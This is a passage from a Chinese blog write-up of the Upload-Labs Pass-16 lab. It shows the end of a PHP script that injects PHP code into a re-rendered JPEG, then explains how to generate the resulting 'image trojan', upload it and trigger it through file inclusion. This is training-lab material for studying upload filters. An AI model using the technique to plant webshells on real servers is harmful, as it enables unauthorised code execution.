</span></span><span style=display:flex><span>        $correctImage <span style=color:#f92672>=</span> <span style=color:#66d9ef>FALSE</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/(\d+) extraneous bytes before marker/&#39;</span>, $errstr, $m)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($m[<span style=color:#ae81ff>1</span>])) {
</span></span><span style=display:flex><span>                $extraBytes <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$m[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DataInputStream</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> $binData;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> $order;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> $size;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($filename, $order <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>, $fromString <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>order</span> <span style=color:#f92672>=</span> $order;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$fromString) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>($filename) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>is_file</span>($filename))
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;File not exists [&#39;</span><span style=color:#f92672>.</span>$filename<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;]&#39;</span>);
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($filename);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> $filename;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>size</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>seek</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>size</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>strlen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>skip</span>($skip) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>, $skip);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>readByte</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>eof</span>()) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;End Of File&#39;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $byte <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ord</span>($byte);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>readShort</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;End Of File&#39;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $short <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>, <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>order</span>) {
</span></span><span style=display:flex><span>                $short <span style=color:#f92672>=</span> (<span style=color:#a6e22e>ord</span>($short[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>ord</span>($short[<span style=color:#ae81ff>0</span>]);
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                $short <span style=color:#f92672>=</span> (<span style=color:#a6e22e>ord</span>($short[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>ord</span>($short[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $short;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>eof</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#f92672>!</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span><span style=color:#f92672>||</span>(<span style=color:#a6e22e>strlen</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>binData</span>) <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h4 id=准备-1>准备</h4><p>​ 准备一个<strong>yoo.jpg</strong>图片，上传经过渲染以后再下载下到本地，保存为<strong>1.jpg</strong>。</p><h4 id=插入代码>插入代码</h4><p>​ 使用脚本处理<strong>1.jpg</strong>插入php代码，执行命令<code>php jpg_payload.php 1.jpg</code>。php命令执行方法上面有。执行成功以后应该如图所示：</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png alt></p><p>​ 执行的目录下会多出一个名为<code>payload_1.jpg</code>的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。</p><h4 id=上传并验证>上传并验证</h4><p>​ 上传以后同样先确定图片的名称和地址，适用文件包含进行验证</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png alt></p><p>​ 如果如图所示，我们的图片马就上传成功了。<strong>需要提醒：有些图片不行可能需要多换几个图片试一试！！！</strong></p><p>呼，终于可以休息了。</p></div></article><div class=blog-post-comments><div id=tcomment></div><script src=https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.braindance.top/.netlify/functions/twikoo",el:"#tcomment",lang:"zh-CN"})</script></div><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li><li><a href=/friends>Friends</a></li><li><a href>开往</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#pass-16>Pass-16</a></li><li><a href=#第一种方法>第一种方法</a><ul><li><a href=#jpg格式>jpg格式</a></li><li><a href=#其他格式>其他格式</a></li></ul></li><li><a href=#第二种方法>第二种方法</a><ul><li><a href=#gif格式>GIF格式</a></li><li><a href=#png格式>png格式</a></li><li><a href=#jpg格式-1>jpg格式</a></li></ul></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=%2fposts%2fctf%2fupload-labs4%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=%2fposts%2fctf%2fupload-labs4%2f&text=Upload-Labs%e4%b9%8bPass-16" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fctf%2fupload-labs4%2f&is_video=false&description=Upload-Labs%e4%b9%8bPass-16" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Upload-Labs%e4%b9%8bPass-16&body=Check out this article: %2fposts%2fctf%2fupload-labs4%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=%2fposts%2fctf%2fupload-labs4%2f&name=Upload-Labs%e4%b9%8bPass-16&description=%3ch2%20id%3d%22%e5%89%8d%e8%a8%80%22%3e%e5%89%8d%e8%a8%80%3c%2fh2%3e%0a%3cp%3e%e2%80%8b%09%e6%88%91%e5%9c%a8%e8%bf%99%e9%81%93%e9%a2%98%e4%b8%8a%e8%8a%b1%e4%ba%86%e5%bf%ab%e4%b8%80%e5%a4%a9%e7%9a%84%e6%97%b6%e9%97%b4%ef%bc%8c%e4%bd%86%e6%98%af%e4%b9%9f%e5%ad%a6%e5%88%b0%e4%ba%86%e4%b8%8d%e5%b0%91%e5%a7%bf%e5%8a%bf%ef%bc%8c%e8%a7%89%e5%be%97%e4%b8%9c%e8%a5%bf%e5%ba%94%e8%af%a5%e8%b6%b3%e5%a4%9f%e5%a4%9a%ef%bc%8c%e8%80%8c%e4%b8%94%e5%8f%82%e8%80%83%e4%ba%86%e7%9a%84%e5%8d%9a%e5%ae%a2%e5%8f%91%e7%8e%b0%e8%bf%99%e9%81%93%e9%a2%98%e7%ae%97%e6%98%af%e6%9c%89%e6%ad%a7%e4%b9%89%e7%9a%84%ef%bc%8c%e4%b8%8d%e7%9f%a5%e9%81%93%e4%bd%9c%e8%80%85%e6%83%b3%e8%a6%81%e8%80%83%e5%af%9f%e7%9a%84%e7%82%b9%e6%98%af%e5%93%aa%e4%b8%80%e4%b8%aa%ef%bc%8c%e6%89%80%e4%bb%a5%e7%ae%97%e6%98%af%e6%9c%89%e4%b8%a4%e7%a7%8d%e8%a7%a3%e6%b3%95%e5%90%a7%ef%bc%8c%e5%8f%af%e6%83%9c%e7%9a%84%e6%98%af%e4%b8%a4%e7%a7%8d%e6%96%b9%e6%b3%95%e9%83%bd%e4%b8%8d%e7%ae%97%e6%98%af%e5%a4%a7%e6%88%90%e5%8a%9f%ef%bc%8c%e5%8f%aa%e6%9c%89%e9%83%a8%e5%88%86%e6%88%90%e5%8a%9f%e6%89%a7%e8%a1%8c%e4%ba%86%e3%80%82%3c%2fp%3e%0a%3cp%3e%e2%80%8b%09%e5%8f%82%e8%80%83%e5%8d%9a%e5%ae%a2%ef%bc%9a%3ca%20href%3d%22https%3a%2f%2fxz.aliyun.com%2ft%2f2657%23toc-4%22%3eupload-labs%e4%b9%8bpass%2016%e8%af%a6%e7%bb%86%e5%88%86%e6%9e%90%3c%2fa%3e%3c%2fp%3e%0a%3ch2%20id%3d%22pass-16%22%3ePass-16%3c%2fh2%3e%0a%3cp%3e%e2%80%8b%09%e6%ba%90%e7%a0%81%ef%bc%88%e4%b8%89%e7%a7%8d%e5%9b%be%e7%89%87%e7%9a%84%e5%88%a4%e5%ae%9a%ef%bc%8c%e5%8f%aa%e8%b4%b4%e4%b8%80%e4%b8%aa%e5%90%a7%ef%bc%8c%e7%af%87%e5%b9%85%e5%b0%8f%e4%b8%80%e7%82%b9%ef%bc%89%ef%bc%9a%3c%2fp%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%20class%3d%22language-php%22%20data-lang%3d%22php%22%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%24is_upload%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3efalse%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3enull%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%20%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3eisset%3c%2fspan%3e%28%24_POST%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bsubmit%26%2339%3b%3c%2fspan%3e%5d%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%20%e8%8e%b7%e5%be%97%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af%ef%bc%8c%e6%96%87%e4%bb%b6%e5%90%8d%ef%bc%8c%e7%b1%bb%e5%9e%8b%ef%bc%8c%e5%a4%a7%e5%b0%8f%ef%bc%8c%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%24filename%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24filetype%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btype%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24tmpname%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24target_path%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eUPLOAD_PATH%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3ebasename%3c%2fspan%3e%28%24filename%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%20%e8%8e%b7%e5%be%97%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e6%89%a9%e5%b1%95%e5%90%8d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%24fileext%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3esubstr%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3estrrchr%3c%2fspan%3e%28%24filename%2c%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b.%26%2334%3b%3c%2fspan%3e%29%2c%3cspan%20style%3d%22color%3a%23ae81ff%22%3e1%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e5%88%a4%e6%96%ad%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e4%b8%8e%e7%b1%bb%e5%9e%8b%ef%bc%8c%e5%90%88%e6%b3%95%e6%89%8d%e8%bf%9b%e8%a1%8c%e4%b8%8a%e4%bc%a0%e6%93%8d%e4%bd%9c%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bjpg%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fjpeg%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3emove_uploaded_file%3c%2fspan%3e%28%24tmpname%2c%24target_path%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e4%bd%bf%e7%94%a8%e4%b8%8a%e4%bc%a0%e7%9a%84%e5%9b%be%e7%89%87%e7%94%9f%e6%88%90%e6%96%b0%e7%9a%84%e5%9b%be%e7%89%87%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%24im%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eimagecreatefromjpeg%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%24im%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3efalse%3c%2fspan%3e%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e8%af%a5%e6%96%87%e4%bb%b6%e4%b8%8d%e6%98%afjpg%e6%a0%bc%e5%bc%8f%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eunlink%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e7%bb%99%e6%96%b0%e5%9b%be%e7%89%87%e6%8c%87%e5%ae%9a%e6%96%87%e4%bb%b6%e5%90%8d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3esrand%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3etime%3c%2fspan%3e%28%29%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24newfilename%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3estrval%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3erand%3c%2fspan%3e%28%29%29%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b.jpg%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e6%98%be%e7%a4%ba%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e5%90%8e%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%88%e4%bd%bf%e7%94%a8%e7%94%a8%e6%88%b7%e4%b8%8a%e4%bc%a0%e5%9b%be%e7%89%87%e7%94%9f%e6%88%90%e7%9a%84%e6%96%b0%e5%9b%be%e7%89%87%ef%bc%89%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24img_path%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eUPLOAD_PATH%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24newfilename%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eimagejpeg%3c%2fspan%3e%28%24im%2c%24img_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eunlink%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24is_upload%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3etrue%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%7d%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e4%b8%8a%e4%bc%a0